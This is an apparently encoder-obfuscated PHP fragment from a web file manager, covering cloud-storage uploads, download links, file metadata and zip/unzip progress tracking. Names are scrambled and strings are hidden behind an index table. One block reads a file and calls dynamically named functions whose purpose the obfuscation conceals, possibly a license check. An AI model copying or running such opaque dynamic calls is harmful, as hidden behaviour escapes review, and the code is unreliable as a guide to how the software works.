function uploadFormData($éÛİ²•, $ˆ¸¾¾½í = 3600) { return $this->uploadPolicy($éÛİ²•, $ˆ¸¾¾½í); } public function multiUploadFormData($Æè·ûãœ, $Ñääºı» = 3600) { $ÇÓ¤Ä±Ã =& $_SERVER[ú÷îèÆÜ]; $Ö‚òúÃö = (int) $GLOBALS[$ÇÓ¤Ä±Ã[17]][$ÇÓ¤Ä±Ã[86]]; return $this->uploadPolicy($Æè·ûãœ, $Ñääºı», $Ö‚òúÃö); } private function uploadPolicy($Ø·ùƒƒ, $²î¤áÁ = 3600, $ÊÌıÚ‰Í = 0) { $³•ûí· =& $_SERVER[ú÷îèÆÜ]; $ÁÓ·ˆèÑ = $³•ûí·[18] . $this->bucket; $­ğæ¹¼é = gmdate($³•ûí·[1443]); $æÚö·‘Ô = array($³•ûí·[1510] => $this->bucket, $³•ûí·[1511] => $Ø·ùƒƒ, $³•ûí·[1512] => time() + $²î¤áÁ, $³•ûí·[1513] => $­ğæ¹¼é); if ($ÊÌıÚ‰Í) { $æÚö·‘Ô[$³•ûí·[1424]] = $ÊÌıÚ‰Í; } $ÕÅèêëö = base64_encode(json_encode($æÚö·‘Ô)); $ÛÃ‚…ğ = base64_encode(hash_hmac($³•ûí·[1480], "\120\x4f\x53\124\x26{$ÁÓ·ˆèÑ}\46{$­ğæ¹¼é}\x26{$ÕÅèêëö}", md5("{$this->userpass}"), !0)); $æ¢èÈ¬à = array($³•ûí·[285] => $ÕÅèêëö, $³•ûí·[1514] => "\125\x50\x59\125\116\x20{$this->username}\72{$ÛÃ‚…ğ}", $³•ûí·[206] => $this->endpoint . $ÁÓ·ˆèÑ); return $æ¢èÈ¬à; } public function download($Åà£Ø–ó, $²Ñ¾ˆ¢¤) { $úÏÎ–£ = IO::getPathInner(IO::mkfile($²Ñ¾ˆ¢¤)); if (!($É†¼Ã« = $this->link($Åà£Ø–ó))) { return !1; } $ï´ÊæÓÌ = 0; $Š„¥È = 1024 * 200; $î£ğò˜ = fopen($úÏÎ–£, $_SERVER[ú÷îèÆÜ][1464]); while (!0) { $£³¼¥ôª = $this->fileSubstr($Åà£Ø–ó, $ï´ÊæÓÌ, $Š„¥È); if ($£³¼¥ôª === !1) { return !1; } fwrite($î£ğò˜, $£³¼¥ôª); $ï´ÊæÓÌ += $Š„¥È; if (strlen($£³¼¥ôª) < $Š„¥È) { break; } } fclose($î£ğò˜); return $²Ñ¾ˆ¢¤; } public function link($ŸŒ¨İÚğ, $à•‡“á· = array()) { $î™ô¶ =& $_SERVER[ú÷îèÆÜ]; $ŸŒ¨İÚğ = trim($ŸŒ¨İÚğ, $î™ô¶[18]); if (!empty($this->token)) { $´³„Ìíœ = strtotime(date($î™ô¶[1515])); $Ü£ğÓ×Ç = substr(md5($this->token . $î™ô¶[337] . $´³„Ìíœ . $î™ô¶[1516] . $ŸŒ¨İÚğ), 12, 8) . $´³„Ìíœ; $à•‡“á·[] = $î™ô¶[1517] . $Ü£ğÓ×Ç; } $Ÿ¾“âåö = !empty($à•‡“á·) ? $î™ô¶[83] . implode($î™ô¶[337], $à•‡“á·) : $î™ô¶[22]; return $this->getHost() . $î™ô¶[18] . $ŸŒ¨İÚğ . $Ÿ¾“âåö; } public function fileOut($ü°É´«, $áÎ²ú = false, $¼åèëĞº = false, $şÑ¸×ÂŠ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ü°É´«, $áÎ²ú, $¼åèëĞº, $şÑ¸×ÂŠ); } if (!$¼åèëĞº) { $¼åèëĞº = $this->pathThis($ü°É´«); } $‚äÉƒ² = $áÎ²ú ? array($_SERVER[ú÷îèÆÜ][1518] . rawurlencode($¼åèëĞº)) : array(); $‘‚´îŒ = $this->link($ü°É´«, $‚äÉƒ²); $this->fileOutLink($‘‚´îŒ); } public function fileOutServer($¨Ã×½, $İÊº‹‚Ğ = false, $“ˆÃĞ±Ã = false, $‡ñÃ¦ËÕ = '') { parent::fileOut($¨Ã×½, $İÊº‹‚Ğ, $“ˆÃĞ±Ã, $‡ñÃ¦ËÕ); } public function fileOutImage($Àİ€®ÎÀ, $¸¼Ïõ¯ = 250) { $—Û„› = $this->link($Àİ€®ÎÀ . $_SERVER[ú÷îèÆÜ][1519] . $¸¼Ïõ¯); $this->fileOutLink($—Û„›); } public function fileOutImageServer($ÉœÆ»¥ô, $ß‚¨¯Úç = 250) { parent::fileOutImage($ÉœÆ»¥ô, $ß‚¨¯Úç); } public function hashMd5($˜´É§ÏÏ) { $²•‡„àÉ =& $_SERVER[ú÷îèÆÜ]; $ûä€™¥  = $this->_objectMeta($˜´É§ÏÏ); return isset($ûä€™¥ [$²•‡„àÉ[238]]) ? $ûä€™¥ [$²•‡„àÉ[238]] : !1; } public function size($üøÔ—²) { $ºÒşŞ‡™ = $this->objectMeta($üøÔ—²); return $ºÒşŞ‡™ ? $ºÒşŞ‡™[$_SERVER[ú÷îèÆÜ][86]] : 0; } public function info($Òùœó¸Ï) { if ($this->isFolder($Òùœó¸Ï)) { return $this->folderInfo($Òùœó¸Ï); } else { if ($this->isFile($Òùœó¸Ï)) { return $this->fileInfo($Òùœó¸Ï); } } return !1; } public function exist($ğÎğáÜ) { return $this->isFile($ğÎğáÜ) || $this->isFolder($ğÎğáÜ); } public function isFile($”ô‚è‚â) { return !$this->isFolder($”ô‚è‚â) && $this->objectMeta($”ô‚è‚â); } public function isFolder($ ì•šÀË) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][176], $ ì•šÀË); } protected function objectMeta($×ï†ÙÚ) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][178], $×ï†ÙÚ); } protected function _objectMeta($¹á¨¤„¡) { $©ıöû„í =& $_SERVER[ú÷îèÆÜ]; if ($¹á¨¤„¡ == $©ıöû„í[22] || $¹á¨¤„¡ == $©ıöû„í[18]) { return array(); } $ŸÙÖµóŞ = $this->ussRequest($¹á¨¤„¡, $©ıöû„í[1520]); if (!$ŸÙÖµóŞ[$©ıöû„í[1253]]) { return null; } $²Ùˆµ = isset($ŸÙÖµóŞ[$©ıöû„í[1243]]) ? $ŸÙÖµóŞ[$©ıöû„í[1243]] : array(); if (!isset($²Ùˆµ[$©ıöû„í[1521]])) { return null; } $ô²ëè…Æ = array($©ıöû„í[43] => isset($²Ùˆµ[$©ıöû„í[1521]]) ? $²Ùˆµ[$©ıöû„í[1521]] : null, $©ıöû„í[86] => isset($²Ùˆµ[$©ıöû„í[1522]]) ? $²Ùˆµ[$©ıöû„í[1522]] : null, $©ıöû„í[238] => isset($²Ùˆµ[$©ıöû„í[1523]]) ? $²Ùˆµ[$©ıöû„í[1523]] : null, $©ıöû„í[1490] => isset($²Ùˆµ[$©ıöû„í[1524]]) ? $²Ùˆµ[$©ıöû„í[1524]] : null); $ô²ëè…Æ[$©ıöû„í[1491]] = isset($²Ùˆµ[$©ıöû„í[1525]]) ? strtotime($²Ùˆµ[$©ıöû„í[1525]]) : $ô²ëè…Æ[$©ıöû„í[1490]]; return $ô²ëè…Æ; } protected function _isFolder($Š˜’ôù˜) { $°ÔÅİşõ =& $_SERVER[ú÷îèÆÜ]; if ($Š˜’ôù˜ == $°ÔÅİşõ[22] || $Š˜’ôù˜ == $°ÔÅİşõ[18]) { return !0; } $²¯öå¯¾ = $this->_objectMeta($Š˜’ôù˜); return isset($²¯öå¯¾[$°ÔÅİşõ[43]]) && $²¯öå¯¾[$°ÔÅİşõ[43]] == $°ÔÅİşõ[85] ? !0 : !1; } } goto cœ­ÕÊê·‘; A«í‰ğñØ™: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ñŒï¼ï, $ğ­ø“Ó = 5.0) { if (!$ñŒï¼ï) { return; } $…°şç“… = Cache::get($ñŒï¼ï); if (!$…°şç“… || timeFloat() - floatVal($…°şç“…) >= $ğ­ø“Ó) { Cache::set($ñŒï¼ï, timeFloat(), $ğ­ø“Ó * 10); return !0; } return !1; } public static function timeLimitCall($áˆ´²ƒé, $Á¨Õ¬Ÿ’, $“îÇÍ©, $ùÍ—µ¯ü = 5.0) { $ş¼¤áœŞ =& $_SERVER[ú÷îèÆÜ]; if (!$áˆ´²ƒé || !$Á¨Õ¬Ÿ’) { return; } self::$asyncAdd = !0; $õÁÁ£æ = $ş¼¤áœŞ[1791]; $Ğı­×è = Cache::get($õÁÁ£æ, !0); $¬¿¾¨”¦ = array($ş¼¤áœŞ[1792] => timeFloat(), $ş¼¤áœŞ[1793] => timeFloat(), $ş¼¤áœŞ[317] => $Á¨Õ¬Ÿ’, $ş¼¤áœŞ[1783] => $“îÇÍ©, $ş¼¤áœŞ[204] => $ùÍ—µ¯ü); if (is_array($Ğı­×è[$áˆ´²ƒé])) { $¬¿¾¨”¦[$ş¼¤áœŞ[1793]] = $Ğı­×è[$áˆ´²ƒé][$ş¼¤áœŞ[1793]]; } if (is_array($Ğı­×è[$áˆ´²ƒé])) { if (timeFloat() - $Ğı­×è[$áˆ´²ƒé][$ş¼¤áœŞ[1792]] < $¬¿¾¨”¦[$ş¼¤áœŞ[204]] * 0.3) { return; } $¬¿¾¨”¦[$ş¼¤áœŞ[1793]] = $Ğı­×è[$áˆ´²ƒé][$ş¼¤áœŞ[1793]]; } $Ğı­×è[$áˆ´²ƒé] = $¬¿¾¨”¦; Cache::set($õÁÁ£æ, $Ğı­×è, 60); Cache::removeMemory($õÁÁ£æ); write_log($ş¼¤áœŞ[1794] . $áˆ´²ƒé . $ş¼¤áœŞ[81] . $Á¨Õ¬Ÿ’, $ş¼¤áœŞ[195]); } public static function timeLimitCallLoop() { $ãÀóÁ¢ =& $_SERVER[ú÷îèÆÜ]; $ğŸƒ¿šî = array($ãÀóÁ¢[1795]); $ªÆÇ’ŠÛ = in_array(strtolower(ACTION), $ğŸƒ¿šî); if (!$ªÆÇ’ŠÛ && !self::$asyncAdd) { return; } $ÃÇ‚ı¼ = $ãÀóÁ¢[1791]; $«œ„À”Ï = Cache::get($ÃÇ‚ı¼, !0); if (!$«œ„À”Ï || count($«œ„À”Ï) <= 0) { return; } $ñşæ—®© = !1; $ÏÔÃ¼¹¸ = timeFloat(); $±…òÅ = array(); foreach ($«œ„À”Ï as $´ÀÑ‘“ => $´Ëàô½é) { if ($ÏÔÃ¼¹¸ - $´Ëàô½é[$ãÀóÁ¢[1793]] > $´Ëàô½é[$ãÀóÁ¢[204]]) { $ñşæ—®© = !0; try { Hook::apply($´Ëàô½é[$ãÀóÁ¢[317]], $´Ëàô½é[$ãÀóÁ¢[1783]]); write_log($ãÀóÁ¢[1796] . $´ÀÑ‘“ . $ãÀóÁ¢[81] . $´Ëàô½é[$ãÀóÁ¢[317]] . $ãÀóÁ¢[1797] . ACTION, $ãÀóÁ¢[195]); } catch (Exception $ûÕôòõú) { } continue; } $±…òÅ[$´ÀÑ‘“] = $´Ëàô½é; } if (!$ñşæ—®©) { return; } if (!$±…òÅ) { return Cache::remove($ÃÇ‚ı¼); } Cache::set($ÃÇ‚ı¼, $±…òÅ, 60); Cache::removeMemory($ÃÇ‚ı¼); } public static function finished($£œ‰¾Ñê, $¼åµ ›Á) { $Å“şæÆş =& $_SERVER[ú÷îèÆÜ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Å“şæÆş[317] => $£œ‰¾Ñê, $Å“şæÆş[1783] => $¼åµ ›Á); } private static function finishedRun() { $æğ”ô©’ =& $_SERVER[ú÷îèÆÜ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $çª¿È) { try { Hook::apply($çª¿È[$æğ”ô©’[317]], $çª¿È[$æğ”ô©’[1783]]); } catch (Exception $…Š¼òÃ¨) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¡ÇÃ‡Ÿğ =& $_SERVER[ú÷îèÆÜ]; parent::startAfter(); Hook::bind($¡ÇÃ‡Ÿğ[1798], array($this, $¡ÇÃ‡Ÿğ[1799])); Hook::bind($¡ÇÃ‡Ÿğ[1234], array($this, $¡ÇÃ‡Ÿğ[1800])); Hook::bind($¡ÇÃ‡Ÿğ[1801], array($this, $¡ÇÃ‡Ÿğ[1802])); $´ªšĞ”Ü =& $this->task; $´ªšĞ”Ü[$¡ÇÃ‡Ÿğ[1803]] = $¡ÇÃ‡Ÿğ[1235]; if (!$´ªšĞ”Ü[$¡ÇÃ‡Ÿğ[1582]]) { $´ªšĞ”Ü[$¡ÇÃ‡Ÿğ[1582]] = LNG($¡ÇÃ‡Ÿğ[1804]); } } protected function endAfter() { $€¤»–§Â =& $_SERVER[ú÷îèÆÜ]; parent::endAfter(); Hook::unbind($€¤»–§Â[1798], array($this, $€¤»–§Â[1799])); Hook::unbind($€¤»–§Â[1234], array($this, $€¤»–§Â[1800])); Hook::unbind($€¤»–§Â[1801], array($this, $€¤»–§Â[1802])); } public function updateAfter() { $Ğ÷ÇÆœ =& $_SERVER[ú÷îèÆÜ]; $’‘œ±¹ =& $this->task; if (!$’‘œ±¹[$Ğ÷ÇÆœ[826]] || !$’‘œ±¹[$Ğ÷ÇÆœ[803]]) { if ($’‘œ±¹[$Ğ÷ÇÆœ[1803]] != $Ğ÷ÇÆœ[366]) { return; } } if ($’‘œ±¹[$Ğ÷ÇÆœ[1803]] == $Ğ÷ÇÆœ[1235]) { $Ê¤ªµ…¾ = 0; if ($’‘œ±¹[$Ğ÷ÇÆœ[1738]]) { $Ê¤ªµ…¾ = $’‘œ±¹[$Ğ÷ÇÆœ[1739]] / $’‘œ±¹[$Ğ÷ÇÆœ[1738]]; } $’‘œ±¹[$Ğ÷ÇÆœ[1687]] = $Ê¤ªµ…¾ * 0.3; } else { if ($’‘œ±¹[$Ğ÷ÇÆœ[1803]] == $Ğ÷ÇÆœ[366]) { $Ê¤ªµ…¾ = $’‘œ±¹[$Ğ÷ÇÆœ[1686]] / $’‘œ±¹[$Ğ÷ÇÆœ[826]]; $’‘œ±¹[$Ğ÷ÇÆœ[1687]] = 0.3 + $Ê¤ªµ…¾ * 0.4; } else { if ($’‘œ±¹[$Ğ÷ÇÆœ[1803]] == $Ğ÷ÇÆœ[117]) { $Œ€îñ­– = 0; if ($’‘œ±¹[$Ğ÷ÇÆœ[1740]] == $Ğ÷ÇÆœ[117]) { $Œ€îñ­– = $’‘œ±¹[$Ğ÷ÇÆœ[1739]]; } $Ê¤ªµ…¾ = ($’‘œ±¹[$Ğ÷ÇÆœ[1743]] + $Œ€îñ­–) / $’‘œ±¹[$Ğ÷ÇÆœ[803]]; $’‘œ±¹[$Ğ÷ÇÆœ[1687]] = 0.3 + 0.4 + $Ê¤ªµ…¾ * 0.3; } } } if ($’‘œ±¹[$Ğ÷ÇÆœ[1687]] > 0) { $ÏÁñÃéÖ = timeFloat() - $’‘œ±¹[$Ğ÷ÇÆœ[1689]] - $’‘œ±¹[$Ğ÷ÇÆœ[1692]]; $’‘œ±¹[$Ğ÷ÇÆœ[1693]] = $ÏÁñÃéÖ * (1 - $’‘œ±¹[$Ğ÷ÇÆœ[1687]]) / $’‘œ±¹[$Ğ÷ÇÆœ[1687]]; } } public function addFile($Õ¨İ—) { $Ê¹ëŒÆ’ =& $_SERVER[ú÷îèÆÜ]; $€¬ùˆ²Å =& $this->task; $¬ÕÕÒÎÈ = IO::info($Õ¨İ—); $€¬ùˆ²Å[$Ê¹ëŒÆ’[1736]] = $¬ÕÕÒÎÈ[$Ê¹ëŒÆ’[42]]; $€¬ùˆ²Å[$Ê¹ëŒÆ’[1738]] = $¬ÕÕÒÎÈ[$Ê¹ëŒÆ’[86]]; $€¬ùˆ²Å[$Ê¹ëŒÆ’[1739]] = 0; $€¬ùˆ²Å[$Ê¹ëŒÆ’[1105]] = $Ê¹ëŒÆ’[1759]; $€¬ùˆ²Å[$Ê¹ëŒÆ’[1740]] = $Ê¹ëŒÆ’[1235]; $€¬ùˆ²Å[$Ê¹ëŒÆ’[803]] = $¬ÕÕÒÎÈ[$Ê¹ëŒÆ’[86]]; $€¬ùˆ²Å[$Ê¹ëŒÆ’[826]] = 1; $‘ÚØ³‘» = 0; $€¬ùˆ²Å[$Ê¹ëŒÆ’[1747]] = array($Ê¹ëŒÆ’[1748] => $‘ÚØ³‘» + 1, $Ê¹ëŒÆ’[471] => $¬ÕÕÒÎÈ[$Ê¹ëŒÆ’[42]], $Ê¹ëŒÆ’[94] => $¬ÕÕÒÎÈ[$Ê¹ëŒÆ’[94]], $Ê¹ëŒÆ’[560] => $¬ÕÕÒÎÈ[$Ê¹ëŒÆ’[560]] ? $¬ÕÕÒÎÈ[$Ê¹ëŒÆ’[560]] : $¬ÕÕÒÎÈ[$Ê¹ëŒÆ’[94]]); $this->update(); } public function zipEvent($ÚÏæËµ, $ä¸¸È³, $·È§İÈï, $¹œŞã²’) { $¨…£ƒ° =& $_SERVER[ú÷îèÆÜ]; $£Ìªßö« =& $this->task; $£Ìªßö«[$¨…£ƒ°[1736]] = get_path_this($ä¸¸È³); $£Ìªßö«[$¨…£ƒ°[1738]] = $¹œŞã²’; $£Ìªßö«[$¨…£ƒ°[1739]] = $·È§İÈï; $£Ìªßö«[$¨…£ƒ°[1105]] = $ÚÏæËµ == $¨…£ƒ°[1805] ? $¨…£ƒ°[1806] : $¨…£ƒ°[1807]; $£Ìªßö«[$¨…£ƒ°[1740]] = $¨…£ƒ°[22]; $£Ìªßö«[$¨…£ƒ°[803]] = $¹œŞã²’; $£Ìªßö«[$¨…£ƒ°[1803]] = $¨…£ƒ°[366]; $this->update(); } public function unzipAfter($İ‰àæÆí) { $Ğ¹¡¾Ñä =& $_SERVER[ú÷îèÆÜ]; $ä˜¡¶¼’ =& $this->task; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1803]] = $Ğ¹¡¾Ñä[117]; $õÍ¥İ’¸ = IO::infoWithChildren($İ‰àæÆí); $æ¡ë“‡Û = 0; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1747]] = array($Ğ¹¡¾Ñä[1748] => $æ¡ë“‡Û + 1, $Ğ¹¡¾Ñä[471] => $õÍ¥İ’¸[$Ğ¹¡¾Ñä[42]], $Ğ¹¡¾Ñä[94] => $õÍ¥İ’¸[$Ğ¹¡¾Ñä[94]], $Ğ¹¡¾Ñä[560] => $õÍ¥İ’¸[$Ğ¹¡¾Ñä[560]] ? $õÍ¥İ’¸[$Ğ¹¡¾Ñä[560]] : $õÍ¥İ’¸[$Ğ¹¡¾Ñä[94]]); if ($õÍ¥İ’¸[$Ğ¹¡¾Ñä[43]] == $Ğ¹¡¾Ñä[224]) { $ä˜¡¶¼’[$Ğ¹¡¾Ñä[826]] = 1; } else { $ä˜¡¶¼’[$Ğ¹¡¾Ñä[826]] = $õÍ¥İ’¸[$Ğ¹¡¾Ñä[89]][$Ğ¹¡¾Ñä[87]]; } $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1105]] = $Ğ¹¡¾Ñä[22]; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1740]] = 0; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1686]] = 0; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1738]] = 0; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1739]] = 0; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1736]] = $Ğ¹¡¾Ñä[22]; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[1743]] = 0; $ä˜¡¶¼’[$Ğ¹¡¾Ñä[803]] = $õÍ¥İ’¸[$Ğ¹¡¾Ñä[86]]; $this->update(); self::log($Ğ¹¡¾Ñä[1808] . json_encode(array($ä˜¡¶¼’, $õÍ¥İ’¸))); } public function nameParse($ƒ–ò§Úí) { $à‚ú˜Ğı =& $_SERVER[ú÷îèÆÜ]; $³ÆÊ±Şã =& $this->task; if ($³ÆÊ±Şã[$à‚ú˜Ğı[1803]] == $à‚ú˜Ğı[1235]) { $³ÆÊ±Şã[$à‚ú˜Ğı[1803]] = $à‚ú˜Ğı[366]; $³ÆÊ±Şã[$à‚ú˜Ğı[1743]] = 0; $³ÆÊ±Şã[$à‚ú˜Ğı[803]] = 0; } $Ë€ÈøŞÉ = get_path_this($ƒ–ò§Úí); if (strstr($Ë€ÈøŞÉ, $à‚ú˜Ğı[20])) { $³ÆÊ±Şã[$à‚ú˜Ğı[1686]] += 1; $³ÆÊ±Şã[$à‚ú˜Ğı[826]] += 1; } $³ÆÊ±Şã[$à‚ú˜Ğı[1736]] = $ƒ–ò§Úí; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¬¥ğ”ïÛ =& $_SERVER[ú÷îèÆÜ]; parent::startAfter(); Hook::bind($¬¥ğ”ïÛ[1809], array($this, $¬¥ğ”ïÛ[1799])); Hook::bind($¬¥ğ”ïÛ[1801], array($this, $¬¥ğ”ïÛ[1802])); $¹¾ƒØ£² =& $this->task; $¹¾ƒØ£²[$¬¥ğ”ïÛ[1803]] = $¬¥ğ”ïÛ[1235]; if (!$¹¾ƒØ£²[$¬¥ğ”ïÛ[1582]]) { $¹¾ƒØ£²[$¬¥ğ”ïÛ[1582]] = LNG($¬¥ğ”ïÛ[1810]); } } protected function endAfter() { $·€µÏ¸ò =& $_SERVER[ú÷îèÆÜ]; parent::endAfter(); Hook::unbind($·€µÏ¸ò[1809], array($this, $·€µÏ¸ò[1799])); Hook::unbind($·€µÏ¸ò[1801], array($this, $·€µÏ¸ò[1802])); } public function updateAfter() { $ˆ¼’¸Ü« =& $_SERVER[ú÷îèÆÜ]; $ºí³¾¬¨ =& $this->task; if (!$ºí³¾¬¨[$ˆ¼’¸Ü«[826]] || !$ºí³¾¬¨[$ˆ¼’¸Ü«[803]]) { return; } if ($ºí³¾¬¨[$ˆ¼’¸Ü«[1803]] == $ˆ¼’¸Ü«[1235]) { $…‰¾ÛÅ = $ºí³¾¬¨[$ˆ¼’¸Ü«[1739]]; if ($ºí³¾¬¨[$ˆ¼’¸Ü«[1740]] != $ˆ¼’¸Ü«[1235]) { $…‰¾ÛÅ = 0; } $›çˆËÎ© = ($ºí³¾¬¨[$ˆ¼’¸Ü«[1743]] + $…‰¾ÛÅ) / $ºí³¾¬¨[$ˆ¼’¸Ü«[803]]; $ºí³¾¬¨[$ˆ¼’¸Ü«[1687]] = $›çˆËÎ© * 0.3; } else { if ($ºí³¾¬¨[$ˆ¼’¸Ü«[1803]] == $ˆ¼’¸Ü«[366]) { $›çˆËÎ© = $ºí³¾¬¨[$ˆ¼’¸Ü«[1686]] / $ºí³¾¬¨[$ˆ¼’¸Ü«[826]]; $ºí³¾¬¨[$ˆ¼’¸Ü«[1687]] = 0.3 + $›çˆËÎ© * 0.5; } else { if ($ºí³¾¬¨[$ˆ¼’¸Ü«[1803]] == $ˆ¼’¸Ü«[117]) { $›çˆËÎ© = 0; if ($ºí³¾¬¨[$ˆ¼’¸Ü«[1738]]) { $›çˆËÎ© = $ºí³¾¬¨[$ˆ¼’¸Ü«[1739]] / $ºí³¾¬¨[$ˆ¼’¸Ü«[1738]]; } $ºí³¾¬¨[$ˆ¼’¸Ü«[1687]] = 0.3 + 0.5 + $›çˆËÎ© * 0.2; } } } if ($ºí³¾¬¨[$ˆ¼’¸Ü«[1687]] > 0) { $ƒıô Ğ§ = timeFloat() - $ºí³¾¬¨[$ˆ¼’¸Ü«[1689]] - $ºí³¾¬¨[$ˆ¼’¸Ü«[1692]]; $ºí³¾¬¨[$ˆ¼’¸Ü«[1693]] = $ƒıô Ğ§ * (1 - $ºí³¾¬¨[$ˆ¼’¸Ü«[1687]]) / $ºí³¾¬¨[$ˆ¼’¸Ü«[1687]]; } } public function copyFileStart($ƒ’ÑšÚ×, $…ïÒè€ù, $‘©¾á‰§, $…ÏÔÈÄ, $½§éÁ§Ï, $¸Ì÷—­œ) { $ÄàíÎ›å =& $_SERVER[ú÷îèÆÜ]; parent::copyFileStart($ƒ’ÑšÚ×, $…ïÒè€ù, $‘©¾á‰§, $…ÏÔÈÄ, $½§éÁ§Ï, $¸Ì÷—­œ); $‰›„…—ı =& $this->task; if ($‰›„…—ı[$ÄàíÎ›å[1803]] == $ÄàíÎ›å[366]) { $‰›„…—ı[$ÄàíÎ›å[1803]] = $ÄàíÎ›å[117]; } $this->update(); } public function copyFileEnd($ßÚÛ˜«í, $Ÿú‹¯¸›, $¢²—¢Åô, $äô„€ë, $‚é›¯Èé, $ªşÓ®) { $½Ô÷Äú  =& $_SERVER[ú÷îèÆÜ]; $ñ°ÃîÓú =& $this->task; $ñ°ÃîÓú[$½Ô÷Äú [1739]] = $ñ°ÃîÓú[$½Ô÷Äú [1738]]; $ñ°ÃîÓú[$½Ô÷Äú [1743]] += $ñ°ÃîÓú[$½Ô÷Äú [1738]]; $ñ°ÃîÓú[$½Ô÷Äú [1740]] = $½Ô÷Äú [22]; $this->update(); } public function zipEvent($Ø¦Ë»úØ, $©„êº¥¦, $•Å¬¯Ãê, $ÒÛ´‰¾•) { $®¢Àİ³ =& $_SERVER[ú÷îèÆÜ]; $Õ´ÆêƒÖ =& $this->task; $Õ´ÆêƒÖ[$®¢Àİ³[1736]] = get_path_this($©„êº¥¦); $Õ´ÆêƒÖ[$®¢Àİ³[1738]] = $ÒÛ´‰¾•; $Õ´ÆêƒÖ[$®¢Àİ³[1739]] = $•Å¬¯Ãê; $Õ´ÆêƒÖ[$®¢Àİ³[1105]] = $Ø¦Ë»úØ == $®¢Àİ³[1811] ? $®¢Àİ³[1806] : $®¢Àİ³[1807]; $Õ´ÆêƒÖ[$®¢Àİ³[1740]] = $®¢Àİ³[22]; $Õ´ÆêƒÖ[$®¢Àİ³[803]] = $ÒÛ´‰¾•; $Õ´ÆêƒÖ[$®¢Àİ³[1803]] = $®¢Àİ³[366]; $this->update(); } public function nameParse($ ºô¬å) { $¿¬¯Ô‰ˆ =& $_SERVER[ú÷îèÆÜ]; $×ûù§¾ =& $this->task; if ($×ûù§¾[$¿¬¯Ô‰ˆ[1686]] < $×ûù§¾[$¿¬¯Ô‰ˆ[826]]) { $ï²íÛÜŞ = get_path_this($ ºô¬å); if (strstr($ï²íÛÜŞ, $¿¬¯Ô‰ˆ[20])) { $×ûù§¾[$¿¬¯Ô‰ˆ[1686]] += 1; } } if ($×ûù§¾[$¿¬¯Ô‰ˆ[1803]] == $¿¬¯Ô‰ˆ[1235]) { $×ûù§¾[$¿¬¯Ô‰ˆ[1803]] = $¿¬¯Ô‰ˆ[366]; } $×ûù§¾[$¿¬¯Ô‰ˆ[1736]] = $ ºô¬å; $this->update(); } } goto d¢†ãñËÄå; aˆğ„÷åğ: if ($_SERVER[$_SERVER[ú÷îèÆÜ][6]] != $_SERVER[$_SERVER[ú÷îèÆÜ][7]]) { $_getc = $_SERVER[ú÷îèÆÜ][8]; $_getfile = $_SERVER[$_SERVER[ú÷îèÆÜ][9]] . $_SERVER[ú÷îèÆÜ][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ú÷îèÆÜ][11], $_getfilec); if (count($_getarrs) < $_SERVER[ú÷îèÆÜ][12]) { $exit = $_SERVER[ú÷îèÆÜ][13]; $exit(); } $_act = $_SERVER[ú÷îèÆÜ][14]; $_act($_SERVER[$_SERVER[ú÷îèÆÜ][15]]); } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\x63\x65\x5f\x65\166\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\x66\165\x6e\143\164\x69\157\x6e"), array("\144\x65\163\143", '', "\151\x6e\x73\x65\x72\164\54\165\160\144\141\164\145\54\x73\145\154\145\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($óÉØò, $áé¯ÄÑ˜, $¿ÉÆÎµã = '') { $®ı…ŠÂ =& $_SERVER[ú÷îèÆÜ]; if (!$this->eventSave) { return; } $ğ£ô…éÈ = Model($®ı…ŠÂ[1373])->sourceInfo($óÉØò); if (!$ğ£ô…éÈ) { return !1; } if ($this->isCacheEvent($ğ£ô…éÈ, $áé¯ÄÑ˜)) { return; } if ($¿ÉÆÎµã && is_string($¿ÉÆÎµã)) { $¿ÉÆÎµã = array($®ı…ŠÂ[1922] => $¿ÉÆÎµã); } $¡ç¶÷ = defined($®ı…ŠÂ[2104]) ? USER_ID : 0; $ıˆÁî°ƒ = array($®ı…ŠÂ[468] => $óÉØò, $®ı…ŠÂ[2105] => $ğ£ô…éÈ[$®ı…ŠÂ[190]], $®ı…ŠÂ[2106] => $ğ£ô…éÈ[$®ı…ŠÂ[42]], $®ı…ŠÂ[560] => !empty($ğ£ô…éÈ[$®ı…ŠÂ[560]]) ? $ğ£ô…éÈ[$®ı…ŠÂ[560]] : $®ı…ŠÂ[22], $®ı…ŠÂ[1676] => $¡ç¶÷, $®ı…ŠÂ[473] => $áé¯ÄÑ˜, $®ı…ŠÂ[1678] => $¿ÉÆÎµã); $this->addSystemLog($áé¯ÄÑ˜, $ıˆÁî°ƒ); unset($ıˆÁî°ƒ[$®ı…ŠÂ[2106]], $ıˆÁî°ƒ[$®ı…ŠÂ[560]]); return $this->add($ıˆÁî°ƒ); } private function addSystemLog($ò´Äö‚¼, $®ØÚ¡äö) { $ø£Ãøş =& $_SERVER[ú÷îèÆÜ]; if ($ò´Äö‚¼ == $ø£Ãøş[2107]) { $ò´Äö‚¼ = $®ØÚ¡äö[$ø£Ãøş[503]][$ø£Ãøş[2108]]; } else { if (in_array($ò´Äö‚¼, array($ø£Ãøş[1863], $ø£Ãøş[2109]))) { $ò´Äö‚¼ = 